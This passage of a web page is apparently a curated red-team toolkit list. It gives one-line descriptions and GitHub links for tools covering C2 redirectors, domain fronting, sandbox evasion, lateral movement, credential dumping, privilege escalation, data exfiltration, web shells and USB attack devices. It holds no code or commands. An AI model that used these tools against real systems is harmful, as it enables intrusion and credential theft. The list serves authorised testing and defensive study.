hours to setup, and can be compromised in minutes. <a href="https://github.com/n0pe-sled/Postfix-Server-Setup">https://github.com/n0pe-sled/Postfix-Server-Setup</a></li><li><strong>DomainFrontingLists</strong> a list of Domain Frontable Domains by CDN. <a href="https://github.com/vysec/DomainFrontingLists">https://github.com/vysec/DomainFrontingLists</a></li><li><strong>Apache2-Mod-Rewrite-Setup</strong> Quickly Implement Mod-Rewrite in your infastructure. <a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup">https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup</a></li><li><strong>mod_rewrite rule</strong> to evade vendor sandboxes. <a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10">https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10</a></li><li><strong>external_c2 framework</strong> a python framework for usage with Cobalt Strike’s External C2. <a href="https://github.com/Und3rf10w/external_c2_framework">https://github.com/Und3rf10w/external_c2_framework</a></li><li><strong>ExternalC2</strong> a library for integrating communication channels with the Cobalt Strike External C2 server. <a href="https://github.com/ryhanson/ExternalC2">https://github.com/ryhanson/ExternalC2</a></li><li><strong>cs2modrewrite</strong> a tools for convert Cobalt Strike profiles to modrewrite scripts. <a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a></li><li><strong>e2modrewrite</strong> a tools for convert Empire profiles to Apache modrewrite scripts. <a href="https://github.com/infosecn1nja/e2modrewrite">https://github.com/infosecn1nja/e2modrewrite</a></li><li><strong>redi</strong> automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt). <a href="https://github.com/taherio/redi">https://github.com/taherio/redi</a></li><li><strong>Domain Fronting Google App Engine</strong>. <a href="https://github.com/redteam-cyberark/Google-Domain-fronting">https://github.com/redteam-cyberark/Google-Domain-fronting</a></li><li><strong>DomainFrontDiscover</strong> Scripts and results for finding domain frontable CloudFront domains. <a href="https://github.com/peewpw/DomainFrontDiscover">https://github.com/peewpw/DomainFrontDiscover</a></li><li><strong>Automated Empire Infrastructure</strong> <a href="https://github.com/bneg/RedTeam-Automation">https://github.com/bneg/RedTeam-Automation</a></li><li><strong>Serving Random Payloads</strong> with NGINX. <a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9">https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9</a></li><li><strong>meek</strong> is a blocking-resistant pluggable transport for Tor. It encodes a<br>data stream as a sequence of HTTPS requests and responses. <a href="https://github.com/arlolra/meek">https://github.com/arlolra/meek</a></li><li><strong>CobaltStrike-ToolKit</strong> Some useful scripts for CobaltStrike. <a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></li><li><strong>mkhtaccess_red</strong> Auto-generate an HTaccess for payload delivery – automatically pulls ips/nets/etc from known sandbox companies/sources that have been seen before, and redirects them to a benign payload. <a href="https://github.com/violentlydave/mkhtaccess_red">https://github.com/violentlydave/mkhtaccess_red</a></li><li><strong>RedFile</strong> a flask wsgi application that serves files with intelligence, good for serving conditional RedTeam payloads. <a href="https://github.com/outflanknl/RedFile">https://github.com/outflanknl/RedFile</a></li><li><strong>keyserver</strong> Easily serve HTTP and DNS keys for proper payload protection. <a href="https://github.com/leoloobeek/keyserver">https://github.com/leoloobeek/keyserver</a></li><li><strong>DoHC2</strong> allows the ExternalC2 library from Ryan Hanson (<a href="https://github.com/ryhanson/ExternalC2">https://github.com/ryhanson/ExternalC2</a>) to be leveraged for command and control (C2) via DNS over HTTPS (DoH). This is built for the popular Adversary Simulation and Red Team Operations Software Cobalt Strike (<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a>). <a href="https://github.com/SpiderLabs/DoHC2">https://github.com/SpiderLabs/DoHC2</a></li><li><strong>cat-sites</strong> Library of sites for categorization. <a href="https://github.com/audrummer15/cat-sites">https://github.com/audrummer15/cat-sites</a></li></ul><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><ul><li><strong>CrackMapExec</strong> is a swiss army knife for pentesting networks. <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li><li><strong>PowerLessShell</strong> rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. <a href="https://github.com/Mr-Un1k0d3r/PowerLessShell">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></li><li><strong>GoFetch</strong> is a tool to automatically exercise an attack plan generated by the BloodHound application.<br> <a href="https://github.com/GoFetchAD/GoFetch">https://github.com/GoFetchAD/GoFetch</a></li><li><strong>ANGRYPUPPY</strong> a bloodhound attack path automation in CobaltStrike. <a href="https://github.com/vysec/ANGRYPUPPY">https://github.com/vysec/ANGRYPUPPY</a></li><li><strong>DeathStar</strong> is a Python script that uses Empire’s RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques. <a href="https://github.com/byt3bl33d3r/DeathStar">https://github.com/byt3bl33d3r/DeathStar</a></li><li><strong>SharpHound</strong> C# Rewrite of the BloodHound Ingestor. <a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a></li><li><strong>BloodHound.py</strong> is a Python based ingestor for BloodHound, based on Impacket. <a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></li><li><strong>Responder</strong> is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. <a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></li><li><strong>SessionGopher</strong> is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally. <a href="https://github.com/fireeye/SessionGopher">https://github.com/fireeye/SessionGopher</a></li><li><strong>PowerSploit</strong> is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li><li><strong>Nishang</strong> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></li><li><strong>Inveigh</strong> is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. <a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></li><li><strong>PowerUpSQL</strong> a PowerShell Toolkit for Attacking SQL Server. <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></li><li><strong>MailSniper</strong> is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). <a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a></li><li><strong>WMIOps</strong> is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. It’s designed primarily for use on penetration tests or red team engagements. <a href="https://github.com/ChrisTruncer/WMIOps">https://github.com/ChrisTruncer/WMIOps</a></li><li><strong>Mimikatz</strong> is an open-source utility that enables the viewing of credential information from the Windows lsass. <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></li><li><strong>LaZagne</strong> project is an open source application used to retrieve lots of passwords stored on a local computer. <a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></li><li><strong>mimipenguin</strong> a tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. <a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></li><li><strong>PsExec</strong> is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></li><li><strong>KeeThief</strong> allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system. <a href="https://github.com/HarmJ0y/KeeThief">https://github.com/HarmJ0y/KeeThief</a></li><li><strong>PSAttack</strong> combines some of the best projects in the infosec powershell community into a self contained custom PowerShell console. <a href="https://github.com/jaredhaight/PSAttack">https://github.com/jaredhaight/PSAttack</a></li><li><strong>Internal Monologue Attack</strong> Retrieving NTLM Hashes without Touching LSASS. <a href="https://github.com/eladshamir/Internal-Monologue">https://github.com/eladshamir/Internal-Monologue</a></li><li><strong>Impacket</strong> is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. <a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a></li><li><strong>icebreaker</strong> gets plaintext Active Directory credentials if you’re on the internal network but outside the AD environment. <a href="https://github.com/DanMcInerney/icebreaker">https://github.com/DanMcInerney/icebreaker</a></li><li><strong>Living Off The Land Binaries and Scripts (and now also Libraries)</strong> The goal of these lists are to document every binary, script and library that can be used for other purposes than they are designed to. <a href="https://github.com/api0cradle/LOLBAS">https://github.com/api0cradle/LOLBAS</a></li><li><strong>WSUSpendu</strong> for compromised WSUS server to extend the compromise to clients. <a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a></li><li><strong>Evilgrade</strong> is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. <a href="https://github.com/infobyte/evilgrade">https://github.com/infobyte/evilgrade</a></li><li><strong>NetRipper</strong> is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. <a href="https://github.com/NytroRST/NetRipper">https://github.com/NytroRST/NetRipper</a></li><li><strong>LethalHTA</strong> Lateral Movement technique using DCOM and HTA. <a href="https://github.com/codewhitesec/LethalHTA">https://github.com/codewhitesec/LethalHTA</a></li><li><strong>Invoke-PowerThIEf</strong> an Internet Explorer Post Exploitation library. <a href="https://github.com/nettitude/Invoke-PowerThIEf">https://github.com/nettitude/Invoke-PowerThIEf</a></li><li><strong>RedSnarf</strong> is a pen-testing / red-teaming tool for Windows environments. <a href="https://github.com/nccgroup/redsnarf">https://github.com/nccgroup/redsnarf</a></li><li><strong>HoneypotBuster</strong> Microsoft PowerShell module designed for red teams that can be used to find honeypots and honeytokens in the network or at the host. <a href="https://github.com/JavelinNetworks/HoneypotBuster">https://github.com/JavelinNetworks/HoneypotBuster</a></li></ul><h2 id="Establish-Foothold"><a href="#Establish-Foothold" class="headerlink" title="Establish Foothold"></a>Establish Foothold</h2><ul><li><strong>Tunna</strong> is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments. <a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></li><li><strong>reGeorg</strong> the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li><li><strong>Blade</strong> is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper. <a href="https://github.com/wonderqs/Blade">https://github.com/wonderqs/Blade</a></li><li><strong>TinyShell</strong> Web Shell Framework. <a href="https://github.com/threatexpress/tinyshell">https://github.com/threatexpress/tinyshell</a></li><li><strong>PowerLurk</strong> is a PowerShell toolset for building malicious WMI Event Subsriptions. <a href="https://github.com/Sw4mpf0x/PowerLurk">https://github.com/Sw4mpf0x/PowerLurk</a></li><li><strong>DAMP</strong> The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.<br><a href="https://github.com/HarmJ0y/DAMP">https://github.com/HarmJ0y/DAMP</a></li></ul><h2 id="Escalate-Privileges"><a href="#Escalate-Privileges" class="headerlink" title="Escalate Privileges"></a>Escalate Privileges</h2><h3 id="Domain-Escalation"><a href="#Domain-Escalation" class="headerlink" title="Domain Escalation"></a>Domain Escalation</h3><ul><li><strong>PowerView</strong> is a PowerShell tool to gain network situational awareness on Windows domains. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></li><li><strong>Get-GPPPassword</strong> Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></li><li><strong>Invoke-ACLpwn</strong> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured. <a href="https://github.com/fox-it/Invoke-ACLPwn">https://github.com/fox-it/Invoke-ACLPwn</a></li><li><strong>BloodHound</strong> uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li><li><strong>PyKEK</strong> (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></li><li><strong>Grouper</strong> a PowerShell script for helping to find vulnerable settings in AD Group Policy.<br><a href="https://github.com/l0ss/Grouper">https://github.com/l0ss/Grouper</a></li><li><strong>ADRecon</strong> is a tool which extracts various artifacts (as highlighted below) out of an AD environment in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis. <a href="https://github.com/sense-of-security/ADRecon">https://github.com/sense-of-security/ADRecon</a></li><li><strong>ADACLScanner</strong> one script for ACL’s in Active Directory. <a href="https://github.com/canix1/ADACLScanner">https://github.com/canix1/ADACLScanner</a></li><li><strong>LAPSToolkit</strong> a tool to audit and attack LAPS environments. <a href="https://github.com/leoloobeek/LAPSToolkit">https://github.com/leoloobeek/LAPSToolkit</a></li><li><strong>PingCastle</strong> is a free, Windows-based utility to audit the risk level of your AD infrastructure and check for vulnerable practices. <a href="https://www.pingcastle.com/download">https://www.pingcastle.com/download</a></li><li><strong>RiskySPNs</strong> is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). <a href="https://github.com/cyberark/RiskySPN">https://github.com/cyberark/RiskySPN</a></li><li><strong>Mystique</strong> is a PowerShell tool to play with Kerberos S4U extensions, this module can assist blue teams to identify risky Kerberos delegation configurations as well as red teams to impersonate arbitrary users by leveraging KCD with Protocol Transition. <a href="https://github.com/machosec/Mystique">https://github.com/machosec/Mystique</a></li><li><strong>Rubeus</strong> is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpy’s Kekeo project. <a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></li><li><strong>kekeo</strong> is a little toolbox I have started to manipulate Microsoft Kerberos in C (and for fun). <a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></li></ul><h3 id="Local-Escalation"><a href="#Local-Escalation" class="headerlink" title="Local Escalation"></a>Local Escalation</h3><ul><li><strong>UACMe</strong> is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. <a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></li><li><strong>windows-kernel-exploits</strong> a collection windows kernel exploit. <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><strong>PowerUp</strong> aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></li><li><strong>The Elevate Kit</strong> demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload. <a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></li><li><strong>Sherlock</strong> a powerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.<br> <a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></li><li><strong>Tokenvator</strong> a tool to elevate privilege with Windows Tokens. <a href="https://github.com/0xbadjuju/Tokenvator">https://github.com/0xbadjuju/Tokenvator</a></li></ul><h2 id="Data-Exfiltration"><a href="#Data-Exfiltration" class="headerlink" title="Data Exfiltration"></a>Data Exfiltration</h2><ul><li><strong>CloakifyFactory</strong> &amp; the Cloakify Toolset - Data Exfiltration &amp; Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. <a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a></li><li><strong>DET</strong> (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. <a href="https://github.com/sensepost/DET">https://github.com/sensepost/DET</a></li><li><strong>DNSExfiltrator</strong> allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. <a href="https://github.com/Arno0x/DNSExfiltrator">https://github.com/Arno0x/DNSExfiltrator</a></li><li><strong>PyExfil</strong> a Python Package for Data Exfiltration. <a href="https://github.com/ytisf/PyExfil">https://github.com/ytisf/PyExfil</a></li><li><strong>Egress-Assess</strong> is a tool used to test egress data detection capabilities. <a href="https://github.com/ChrisTruncer/Egress-Assess">https://github.com/ChrisTruncer/Egress-Assess</a></li><li><strong>Powershell RAT</strong> python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. <a href="https://github.com/Viralmaniar/Powershell-RAT">https://github.com/Viralmaniar/Powershell-RAT</a></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Wireless-Networks"><a href="#Wireless-Networks" class="headerlink" title="Wireless Networks"></a>Wireless Networks</h3><ul><li><strong>Wifiphisher</strong> is a security tool that performs Wi-Fi automatic association attacks to force wireless clients to unknowingly connect to an attacker-controlled Access Point. <a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a></li><li><strong>Evilginx</strong> is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. <a href="https://github.com/kgretzky/evilginx">https://github.com/kgretzky/evilginx</a></li><li><strong>mana</strong> toolkit for wifi rogue AP attacks and MitM. <a href="https://github.com/sensepost/mana">https://github.com/sensepost/mana</a></li></ul><h3 id="Embedded-amp-Peripheral-Devices-Hacking"><a href="#Embedded-amp-Peripheral-Devices-Hacking" class="headerlink" title="Embedded &amp; Peripheral Devices Hacking"></a>Embedded &amp; Peripheral Devices Hacking</h3><ul><li><strong>magspoof</strong> a portable device that can spoof/emulate any magnetic stripe, credit card or hotel card “wirelessly”, even on standard magstripe (non-NFC/RFID) readers. <a href="https://github.com/samyk/magspoof">https://github.com/samyk/magspoof</a></li><li><strong>WarBerryPi</strong> was built to be used as a hardware implant during red teaming scenarios where we want to obtain as much information as possible in a short period of time with being as stealth as possible. <a href="https://github.com/secgroundzero/warberry">https://github.com/secgroundzero/warberry</a></li><li><strong>P4wnP1</strong> is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). <a href="https://github.com/mame82/P4wnP1">https://github.com/mame82/P4wnP1</a></li><li><strong>malusb</strong> HID spoofing multi-OS payload for Teensy. <a href="https://github.com/ebursztein/malusb">https://github.com/ebursztein/malusb</a></li><li><strong>Fenrir</strong> is a tool designed to be used “out-of-the-box” for penetration tests and offensive engagements. Its main feature and purpose is to bypass wired 802.1x protection and to give you an access to the target network. <a href="https://github.com/Orange-Cyberdefense/fenrir-ocd">https://github.com/Orange-Cyberdefense/fenrir-ocd</a></li><li><strong>poisontap</strong> exploits locked/password protected computers over USB, drops persistent WebSocket-based backdoor, exposes internal router, and siphons cookies using Raspberry Pi Zero &amp; Node.js. <a href="https://github.com/samyk/poisontap">https://github.com/samyk/poisontap</a></li><li><strong>WHID</strong> WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids.<br><a href="https://github.com/whid-injector/WHID">https://github.com/whid-injector/WHID</a></li></ul><h3 id="Software-For-Team-Communication"><a href="#Software-For-Team-Communication" class="headerlink" title="Software For Team Communication"></a>Software For Team Communication</h3><ul><li><strong>RocketChat</strong> is free, unlimited and open source. Replace email &amp; Slack with the ultimate team chat software solution. <a href="https://rocket.chat/">https://rocket.chat</a></li><li><strong>Etherpad</strong> is an open source, web-based collaborative real-time editor, allowing authors to simultaneously edit a text document <a href="https://etherpad.net/">https://etherpad.net</a></li></ul><h3 id="Log-Aggregation"><a href="#Log-Aggregation" class="headerlink" title="Log Aggregation"></a>Log Aggregation</h3><ul><li><strong>RedELK</strong> Red Team’s SIEM - easy deployable tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations. <a href="https://github.com/outflanknl/RedELK/">https://github.com/outflanknl/RedELK/</a></li><li><strong>CobaltSplunk</strong> Splunk Dashboard for CobaltStrike logs. <a href="https://github.com/vysec/CobaltSplunk">https://github.com/vysec/CobaltSplunk</a></li><li><strong>Red Team Telemetry</strong> A collection of scripts and configurations to enable centralized logging of red team infrastructure. <a href="https://github.com/ztgrace/red_team_telemetry">https://github.com/ztgrace/red_team_telemetry</a></li><li><strong>Elastic for Red Teaming</strong> Repository of resources for configuring a Red Team SIEM using Elastic. <a href="https://github.com/SecurityRiskAdvisors/RedTeamSIEM">https://github.com/SecurityRiskAdvisors/RedTeamSIEM</a></li></ul><h3 id="C-Offensive-Framework"><a href="#C-Offensive-Framework" class="headerlink" title="C# Offensive Framework"></a>C# Offensive Framework</h3><ul><li><strong>SharpSploit</strong> is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers. <a href="https://github.com/cobbr/SharpSploit">https://github.com/cobbr/SharpSploit</a></li><li><strong>GhostPack</strong> is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- Seatbelt, SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI. <a href="https://github.com/GhostPack">https://github.com/GhostPack</a></li><li><strong>SharpWeb</strong> .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge. <a href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a></li><li><strong>reconerator</strong> C# Targeted Attack Reconnissance Tools. <a href="https://github.com/stufus/reconerator">https://github.com/stufus/reconerator</a></li><li><strong>SharpView</strong> C# implementation of harmj0y’s PowerView. <a href="https://github.com/tevora-threat/SharpView">https://github.com/tevora-threat/SharpView</a></li><li><strong>Watson</strong> is a (.NET 2.0 compliant) C# implementation of Sherlock. <a href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a></li></ul><h3 id="Labs"><a href="#Labs" class="headerlink" title="Labs"></a>Labs</h3><ul><li><strong>Detection Lab</strong> This lab has been designed with defenders in mind. Its primary purpose is to allow the user to quickly build a Windows domain that comes pre-loaded with security tooling and some best practices when it comes to system logging configurations. <a href="https://github.com/clong/DetectionLab">https://github.com/clong/DetectionLab</a></li><li><strong>Modern Windows Attacks and Defense Lab</strong> This is the lab configuration for the Modern Windows Attacks and Defense class that Sean Metcalf (@pyrotek3) and I teach. <a href="https://github.com/jaredhaight/WindowsAttackAndDefenseLab">https://github.com/jaredhaight/WindowsAttackAndDefenseLab</a></li><li><strong>Invoke-UserSimulator</strong> Simulates common user behaviour on local and remote Windows hosts. <a href="https://github.com/ubeeri/Invoke-UserSimulator">https://github.com/ubeeri/Invoke-UserSimulator</a></li><li><strong>Invoke-ADLabDeployer</strong> Automated deployment of Windows and Active Directory test lab networks. Useful for red and blue teams. <a href="https://github.com/outflanknl/Invoke-ADLabDeployer">https://github.com/outflanknl/Invoke-ADLabDeployer</a></li><li><strong>Sheepl</strong> Creating realistic user behaviour for supporting tradecraft development within lab environments. <a href="https://github.com/SpiderLabs/sheepl">https://github.com/SpiderLabs/sheepl</a></li></ul><h3 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h3><ul><li><p><strong>Aggressor Scripts</strong> is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots.</p><ul><li><a href="https://github.com/invokethreatguy/CSASC">https://github.com/invokethreatguy/CSASC</a></li><li><a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></li><li><a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></li><li><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></li><li><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></li><li><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></li><li><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></li><li><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></li><li><a href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a></li></ul></li><li><p>A collection scripts useful for red teaming and pentesting</p><ul><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a></li><li><a href="https://github.com/nettitude/Powershell">https://github.com/nettitude/Powershell</a></li><li><a href="https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts">https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts</a></li><li><a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a></li><li><a href="https://github.com/SadProcessor/SomeStuff">https://github.com/SadProcessor/SomeStuff</a></li><li><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a></li><li><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff">https://github.com/enigma0x3/Misc-PowerShell-Stuff</a></li><li><a href="https://github.com/ChrisTruncer/PenTestScripts">https://github.com/ChrisTruncer/PenTestScripts</a></li><li><a href="https://github.com/bluscreenofjeff/Scripts">https://github.com/bluscreenofjeff/Scripts</a></li><li><a href="https://github.com/xorrior/RandomPS-Scripts">https://github.com/xorrior/RandomPS-Scripts</a></li><li><a href="https://github.com/xorrior/Random-CSharpTools">https://github.com/xorrior/Random-CSharpTools</a></li><li><a href="https://github.com/leechristensen/Random">https://github.com/leechristensen/Random</a></li><li><a href="https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering">https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering</a></li></ul></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><strong>MITRE’s ATT&amp;CK™</strong> is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary’s lifecycle and the platforms they are known to target. <a href="https://attack.mitre.org/wiki/Main_Page">https://attack.mitre.org/wiki/Main_Page</a></li><li><strong>Cheat Sheets</strong> for various projects (Beacon/Cobalt Strike,PowerView, PowerUp, Empire, and PowerSploit). <a href="https://github.com/HarmJ0y/CheatSheets">https://github.com/HarmJ0y/CheatSheets</a></li><li><strong>PRE-ATT&amp;CK</strong> Adversarial Tactics, Techniques &amp; Common Knowledge for Left-of-Exploit. <a href="https://attack.mitre.org/pre-attack/index.php/Main_Page">https://attack.mitre.org/pre-attack/index.php/Main_Page</a></li><li><strong>Adversary OPSEC</strong> consists of the use of various technologies or 3rd party services to obfuscate, hide, or blend in with accepted network traffic or system behavior. <a href="https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC">https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC</a></li><li><strong>Adversary Emulation Plans</strong> To showcase the practical use of ATT&amp;CK for offensive operators and defenders, MITRE created Adversary Emulation Plans. <a href="https://attack.mitre.org/wiki/Adversary_Emulation_Plans">https://attack.mitre.org/wiki/Adversary_Emulation_Plans</a></li><li><strong>Red-Team-Infrastructure-Wiki</strong> Wiki to collect Red Team infrastructure hardening resources. <a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li><li><strong>Advanced Threat Tactics – Course and Notes</strong> This is a course on red team operations and adversary simulations. <a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes">https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes</a></li><li><strong>Red Team Tips</strong> as posted by @vysecurity on Twitter. <a href="https://vincentyiu.co.uk/red-team-tips">https://vincentyiu.co.uk/red-team-tips</a></li><li><strong>Awesome Red Teaming</strong> List of Awesome Red Team / Red Teaming Resources. <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></li><li><strong>ATT&amp;CK for Enterprise Software</strong> is a generic term for custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT&amp;CK. <a href="https://attack.mitre.org/wiki/Software">https://attack.mitre.org/wiki/Software</a></li><li><strong>Planning a Red Team exercise</strong> This document helps inform red team planning by contrasting against the very specific red team style described in Red Teams. <a href="https://github.com/magoo/redteam-plan">https://github.com/magoo/redteam-plan</a></li><li><strong>Awesome Lockpicking</strong> a curated list of awesome guides, tools, and other resources related to the 